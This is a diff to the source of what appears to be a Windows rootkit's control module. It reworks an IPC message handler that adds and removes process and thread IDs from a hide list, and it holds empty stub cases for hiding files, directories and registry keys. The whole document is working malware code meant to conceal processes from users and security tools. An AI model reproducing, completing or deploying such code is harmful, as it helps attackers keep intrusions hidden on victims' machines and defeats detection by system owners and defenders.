@@ -7,6 +7,7 @@ struct IOCtlTCtx {
 
 // RootKit Controll
 namespace rkc {
+#define RKCTLC(fd, id) ((fd << 4) | (id & 0xf))
 	long __stdcall IOCtlHandler(
 		_In_     HWND   hWnd,
 		_In_     uint32 uMsg,
@@ -17,30 +18,42 @@ namespace rkc {
 		case WM_COPYDATA: // IPC Message
 			{
 				COPYDATASTRUCT* pcd = (COPYDATASTRUCT*)lParam;
-			#define IOCTLLID(fd, id) ((fd << 4) | (id & 0xf))
 				switch (pcd->dwData) {
-				case IOCTLLID(0, 0): // Add Process to hide
-					*(uint32*)ProcessList.AllocateObject(4) = *(uint32*)pcd->lpData; break;
-				case IOCTLLID(0, 1): // Remove Process to hide
-					{
-						ProcessList.LockVector();
-						uint32* id = (uint32*)ProcessList.GetFirstEntry();
+				case RKCTLC(0, 0): // Add Process to hide
+				case RKCTLC(0, 1): // Add ProcessThread to hide
+					ProcessList.WriteLock(); {
+						uint8 v0 = pcd->dwData & 0xf;
+						void* mem = ProcessList.AllocateObject(4 * (v0 + 1) + 1);
+						*(uint8*)mem = v0;
+						v0 ? *(uint64*)((ptr)mem + 1) = *(uint64*)pcd->lpData
+							: *(uint32*)((ptr)mem + 1) = *(uint32*)pcd->lpData;
+					} ProcessList.WriteUnlock(); break;
+
+				case RKCTLC(0, 4): // Remove Process(Thread) to from Hide
+					ProcessList.WriteLock(); {
+						void* Entry = (uint32*)ProcessList.GetFirstEntry();
 						do {
-							if (*id == *(uint32*)pcd->lpData) {
-								ProcessList.FreeObject(id); break;
-							}
-						} while (id = (uint32*)ProcessList.GetNextEntry(id));
-						ProcessList.UnlockVector();
-					} break;
+							if (*(uint8*)Entry == 0) {
+								if (*(uint32*)((ptr)Entry + 1) == *(uint32*)pcd->lpData) {
+									ProcessList.FreeObject(Entry); break;
+								}
+							} else if (*(uint8*)Entry == 1)
+								if (*(uint32*)((ptr)Entry + 5) == *(uint32*)pcd->lpData) {
+									ProcessList.FreeObject(Entry); break;
+								}
+						} while (Entry = ProcessList.GetNextEntry(Entry));
+					} ProcessList.WriteUnlock(); break;
 
-				case IOCTLLID(1, 0): // Add File/Directory to hide
+
+
+				case RKCTLC(1, 0): // Add File/Directory to hide
 					break;
-				case IOCTLLID(1, 1): // Remove File/Directory to hide
+				case RKCTLC(1, 1): // Remove File/Directory to hide
 					break;
 
-				case IOCTLLID(2, 0): // Add RegistryKey to hide
+				case RKCTLC(2, 0): // Add RegistryKey to hide
 					break;
-				case IOCTLLID(2, 1): // Remove RegistryKey to hide
+				case RKCTLC(2, 1): // Remove RegistryKey to hide
 					break;
 
 				case 0x7fffffff: // TestMessage
